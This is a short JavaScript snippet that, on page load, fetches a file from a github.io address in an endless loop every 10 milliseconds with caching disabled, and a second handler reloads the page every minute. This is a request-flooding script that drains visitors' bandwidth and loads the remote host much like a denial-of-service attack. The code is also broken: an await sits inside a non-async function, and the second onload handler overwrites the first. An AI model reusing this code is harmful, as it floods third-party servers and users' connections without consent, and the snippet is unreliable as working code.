// Set delay to ms
function delay(milliseconds){
    return new Promise(resolve => {
      setTimeout(resolve, milliseconds);
    });
}

window.onload = async function startdown(){
    while(true) {
        await delay(10);
        await fetch('https://t0m0t0w.github.io/backuprr/history.dat', {cache: "no-store"})
    }
}

window.onload = function reload(){
    await delay(60000);
    location.reload();
}